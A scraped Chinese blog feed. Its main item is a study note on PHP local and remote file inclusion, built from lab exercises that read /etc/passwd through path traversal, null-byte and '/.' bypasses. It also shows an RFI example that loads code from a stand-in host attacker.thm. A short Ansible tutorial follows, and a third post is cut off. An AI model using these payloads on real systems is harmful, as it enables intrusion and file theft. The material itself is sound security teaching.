                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">什么是文件包含？</h3>
<p>文件包含（File Inclusion）是一种 Web 漏洞，攻击者通过 URL 参数让网站“读取并显示”服务器上不该被访问的文件（比如密码配置、系统文件），甚至执行恶意代码。</p>
<p>【例子】</p>
<ul>
<li>正常请求： <code>http://example.com/view.php?file=about.txt</code> → 显示 <code>about.txt</code></li>
<li>有漏洞时：攻击者改成： <code>http://example.com/view.php?file=../../../etc/passwd</code><br/>
网站错误地读取了 Linux 系统的用户文件 <code>/etc/passwd</code>，<strong>导致敏感信息泄露</strong>。</li>
</ul>
<p>【两种类型】</p>
<ul>
<li><strong>LFI（本地文件包含）</strong> ： 读取<strong>服务器本地</strong>的文件（如配置文件、日志、密码等）。</li>
<li><strong>RFI（远程文件包含）</strong> ：让服务器去加载<strong>黑客控制的外部网址</strong>上的恶意代码（更危险，可能直接接管服务器）。</li>
</ul>
<p>【产生原因】</p>
<ul>
<li>文件包含漏洞常见于各种编程语言中，如 PHP 等，这些语言编写和实现都很差。</li>
<li>这些漏洞的主要问题在于输入验证，即<strong>用户输入未被净化或验证</strong>，<strong>用户控制其内容</strong>。</li>
<li>当输入未被验证时，用户可以将任意输入传递给函数，从而引发漏洞。</li>
</ul>
<p>比如 PHP 里写了：<code>include( $ _GET['file'])</code>，将file参数作文路径直接读取</p>
<h3 data-id="heading-1">本地文件包含</h3>
<p>【定义】</p>
<p>LFI 攻击通常是由于开发者缺乏安全意识所致。使用 PHP 时，使用 include、require、include_once 和 require_once 等函数，往往会增加网络应用的脆弱性，使得攻击者有机会偷窥服务器本地文件</p>
<p>【include( )为例的漏洞】</p>
<p><code>include()</code> 是 PHP 的一个语句，用于将另一个文件的内容插入到当前脚本中。</p>
<ul>
<li>
<p>如果 <code>EN.php</code> 的内容是：</p>
<pre><code class="hljs language-css" lang="css">&lt;<span class="hljs-selector-tag">h1</span>&gt;Welcome in English!&lt;/<span class="hljs-selector-tag">h1</span>&gt;
</code></pre>
<p>那么访问 <code>index.php?lang=EN.php</code> 时，浏览器就会看到：</p>
<pre><code class="hljs language-css" lang="css">&lt;<span class="hljs-selector-tag">h1</span>&gt;Welcome in English!&lt;/<span class="hljs-selector-tag">h1</span>&gt;
</code></pre>
</li>
<li>
<p>如果 <code>EN.php</code> 包含 PHP 代码，比如：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">"Hello, user!"</span>; <span class="hljs-meta">?&gt;</span>
</code></pre>
<p>PHP 代码会被执行，浏览器会看到输出</p>
</li>
</ul>
<p>🔍 补充说明：PHP 在解析 <code>include("xxx")</code> 时，会按以下顺序查找文件：</p>
<ol>
<li><strong>如果路径是绝对路径</strong>（如 <code>/etc/passwd</code> 或 <code>/var/www/langs/EN.php</code>）→ 直接从根目录开始找。</li>
<li><strong>如果是相对路径</strong>（如 <code>EN.php</code>、<code>langs/EN.php</code>）→ 从 <strong>当前脚本所在目录</strong> 开始找。</li>
</ol>
<p>【实践1】</p>
<p>1、输入1，发现Warning中会有inlude（1）的后端代码</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d3b44541e7a4470b59cf965d6c6266d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTk2NTMzMDY3MjEx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467111&amp;x-signature=IhbvOSCBT6QQxVMoAqQsYHE%2By9A%3D" alt="image.png" loading="lazy"/></p>
<p>2、 输入/ect/passwd,利用include漏洞读取服务器的本地文件</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eb893833e3ae4889a9ca3c37af07a530~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTk2NTMzMDY3MjEx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467111&amp;x-signature=CunBpNJtVT%2F3YJ%2FkKNZxfa1AVRk%3D" alt="image.png" loading="lazy"/></p>
<p>【实验2】</p>
<p>1、输入test实验，发现include规定访问includes文件夹下的文件</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac39c44b8d38464e8b9f48bdbb5eceac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTk2NTMzMDY3MjEx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467111&amp;x-signature=ZjFnPMoJC3bZpU3FaWhGa6kZHp0%3D" alt="image.png" loading="lazy"/></p>
<p>2、使用目录穿透，在url参数中使用 ../../../../etc/passwd,穿透inludes文件到达根目录</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/da7462b0de3a4e10893da8e38faf3915~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTk2NTMzMDY3MjEx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467111&amp;x-signature=EdIhOR0Ip1Z6yxUsOpOWlDoo5BE%3D" alt="image.png" loading="lazy"/></p>
<p>【实验3】</p>
<p>1、输入test，发现调用inclue（includs/test.php）
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48468de028d94a83b301d372270032e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTk2NTMzMDY3MjEx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467111&amp;x-signature=JXjiZ6iEfUhw%2Fz7NAdNJ37BALZ0%3D" alt="image.png" loading="lazy"/></p>
<p>2、可以使用../../../../etc/passwd%00，这样可以忽略空字节%00以后得部分，从而防止.php后缀的拼接</p>
<p>【实验4】</p>
<p>1、我们输入etc/passwd,发现开发者不允许访问指定目录</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2d729e3cfd1a43a8b51388fc72284550~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTk2NTMzMDY3MjEx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467111&amp;x-signature=XYKHsPxCnDsSBusOJmi%2BV5zObNc%3D" alt="image.png" loading="lazy"/></p>
<p>2、使用etc/passwd/.，加/.是用来访问当前目录，用来绕过</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/71773408e65a4c4183faa9084d311d80~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTk2NTMzMDY3MjEx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467111&amp;x-signature=Ch1LzPbpAsAVb5FYzC1psKTFwjQ%3D" alt="image.png" loading="lazy"/></p>
<p>【实验6】</p>
<p>1、发现只允许从特定文件夹THM-profile来进行访问</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/65847c22f6fa49dc83d1ce6f388df73f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTk2NTMzMDY3MjEx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467111&amp;x-signature=A9im3Xp%2Flx62zseT0eIUAcriK%2BQ%3D" alt="image.png" loading="lazy"/></p>
<p>2、用THM-profile开头，通过目录穿透，来跳出，进而访问/etc/passwd</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d02cf9123ab4611b1f473e2a7090fec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTk2NTMzMDY3MjEx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467111&amp;x-signature=wUhelQuxYuCk010nKpvKqXIYMV0%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">远程文件包含</h3>
<p>【定义】</p>
<ul>
<li>与 LFI 类似，RFI 发生在用户输入被不当净化时，使攻击者能够将外部 URL 注入到 include 函数中。RFI 的一个要求是 allow_url_fopen 选项必须开启 。</li>
<li>RFI 的风险高于 LFI，因为 RFI 漏洞允许攻击者在服务器上获得远程命令执行权限，可以在服务器上执行自定义的命令</li>
</ul>
<p>【例子】</p>
<p>攻击者在自己的服务器上托管一个 PHP 文件 <code>http://attacker.thm/cmd.txt</code>，其中 cmd.txt 包含打印消息 Hello THM。</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?</span>PHP <span class="hljs-keyword">echo</span> <span class="hljs-string">"Hello THM"</span>; <span class="hljs-meta">?&gt;</span>
</code></pre>
<p>攻击者注入恶意的URL <code>http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt</code>这样就能诱导服务器访问自己的节点并执行代码</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2db26b0d4cb2451f8fa45af8acc17109~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTk2NTMzMDY3MjEx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467111&amp;x-signature=2HwMUbLraDA2%2FsCI5Eh8L7BLAYU%3D" alt="image.png" loading="lazy"/></p>
<p>✅ 可以用<code>python -m http.server</code>将本机启动为服务器，并新建php文件，并进行实验，诱导目标服务器执行本机新建的php</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[今天浅浅的回顾一下Ansible吧]]></title>    <link>https://juejin.cn/post/7592803747470966834</link>    <guid>https://juejin.cn/post/7592803747470966834</guid>    <pubDate>2026-01-08T09:14:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592803747470966834" data-draft-id="7592710766010220554" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="今天浅浅的回顾一下Ansible吧"/> <meta itemprop="keywords" content="运维"/> <meta itemprop="datePublished" content="2026-01-08T09:14:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Sheffield"/> <meta itemprop="url" content="https://juejin.cn/user/362164852109770"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            今天浅浅的回顾一下Ansible吧
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/362164852109770/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Sheffield
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:14:35.000Z" title="Thu Jan 08 2026 09:14:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">什么是Ansible，他有什么用？</h2>
<p>Ansible是一款<strong>无代理自动化运维工具</strong>，核心作用是批量管理服务器：比如批量执行命令、安装软件、配置服务、部署代码等。</p>
<p>它的优势很明显：</p>
<ul>
<li>无代理：被控服务器不用装额外软件，靠SSH就能通信（大多数服务器默认支持）。</li>
<li>用Python写的，跨平台、兼容性好。</li>
<li>配置文件是YAML格式，简单易懂，不用写复杂代码。</li>
<li>轻量：安装简单，学习成本低。</li>
</ul>
<h2 data-id="heading-1">怎么安装Ansible？</h2>
<p>Centos 7 在有epel的情况下：<code>yum install -y ansible</code>即可。</p>
<h2 data-id="heading-2">Ansible的目录结构是什么？</h2>
<p>Ansible默认配置文件和核心目录都在 <code>/etc/ansible/</code> 下，主要有三个文件：</p>
<ul>
<li><strong>ansible.cfg（主配置文件）</strong> ：控制Ansible的运行参数，比如默认SSH端口、超时时间、模块路径等。新手初期不用改，用默认配置即可，后续熟悉后再根据需求调整。</li>
<li><strong>hosts（主机清单）</strong> ：最核心的文件之一！用来记录所有需要管理的被控服务器信息（IP、用户名、端口等），Ansible执行命令时，就是通过这个文件找到目标服务器。</li>
<li><strong>roles（角色目录）</strong> ：用来存放Ansible角色（Role），是进阶功能，用于组织复杂的Playbook。</li>
</ul>
<h2 data-id="heading-3">host的编写</h2>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 单台服务器</span>
lb 192.168.1.100 <span class="hljs-attr">ansible_ssh_user</span>=root ansible_ssh_pass=****

<span class="hljs-comment"># 多台Web服务器分组</span>
<span class="hljs-section">[web]</span>
web01 192.168.1.100 <span class="hljs-attr">ansible_ssh_user</span>=root ansible_ssh_pass=****
web02 192.168.1.100 <span class="hljs-attr">ansible_ssh_user</span>=root ansible_ssh_pass=****
</code></pre>
<p>然后使用<code>ansible lb -m ping</code>/<code>ansible web -m ping</code>测试，出现 <code>"pong"</code> 就说明连接成功了！</p>
<h2 data-id="heading-4">编写自己的第一个Playbook</h2>
<p>Ansible的剧本是Playbook，格式是yml，对于空格有严格的要求。
下面我写个安装Nginx和关闭SElinux、firewalld的Playbook，如下。</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># Play块起始：定义整个任务的核心信息</span>
<span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">install</span> <span class="hljs-string">Nginx</span>  <span class="hljs-comment"># 任务名称：明确该Play的核心作用是安装Nginx</span>
  <span class="hljs-attr">hosts:</span> <span class="hljs-string">lb</span>           <span class="hljs-comment"># 目标主机：操作名为lb的服务器</span>
  
  <span class="hljs-attr">tasks:</span>              <span class="hljs-comment"># 任务列表：后续所有具体操作都放在tasks下</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">install</span> <span class="hljs-string">Nginx</span>  <span class="hljs-comment"># 子任务名称：描述当前步骤作用</span>
      <span class="hljs-attr">yum:</span>                <span class="hljs-comment"># 使用yum模块</span>
        <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span>       <span class="hljs-comment"># 安装的软件名称：nginx</span>
        <span class="hljs-attr">state:</span> <span class="hljs-string">present</span>    <span class="hljs-comment"># 状态：present表示确保软件已安装</span>
    
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">stop</span> <span class="hljs-string">firewalld</span>
      <span class="hljs-attr">service:</span>              <span class="hljs-comment"># 使用service模块：管理系统服务</span>
        <span class="hljs-attr">name:</span> <span class="hljs-string">firewalld</span>     <span class="hljs-comment"># 操作的服务名称：firewalld</span>
        <span class="hljs-attr">state:</span> <span class="hljs-string">stopped</span>      <span class="hljs-comment"># 服务状态：stopped表示停止当前服务</span>
        <span class="hljs-attr">enabled:</span> <span class="hljs-literal">no</span>         <span class="hljs-comment"># 开机自启：no表示禁止服务开机自动启动</span>
    
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">stop</span> <span class="hljs-string">SELinux</span>    <span class="hljs-comment"># 子任务名称</span>
      <span class="hljs-attr">command:</span> <span class="hljs-string">setenforce</span> <span class="hljs-number">0</span> <span class="hljs-comment"># 使用command模块执行系统命令</span>
</code></pre>
<p>先写这么多，后面有时间再多写点干货🤭。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025 年 AI 大事件纪要]]></title>    <link>https://juejin.cn/post/7592815497847521343</link>    <guid>https://juejin.cn/post/7592815497847521343</guid>    <pubDate>2026-01-08T09:37:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592815497847521343" data-draft-id="7592789801708879913" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025 年 AI 大事件纪要"/> <meta itemprop="keywords" content="AI编程"/> <meta itemprop="datePublished" content="2026-01-08T09:37:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="NanBox"/> <meta itemprop="url" content="https://juejin.cn/user/3175045309414935"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025 年 AI 大事件纪要
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3175045309414935/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    NanBox
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:37:23.000Z" title="Thu Jan 08 2026 09:37:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读17分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier 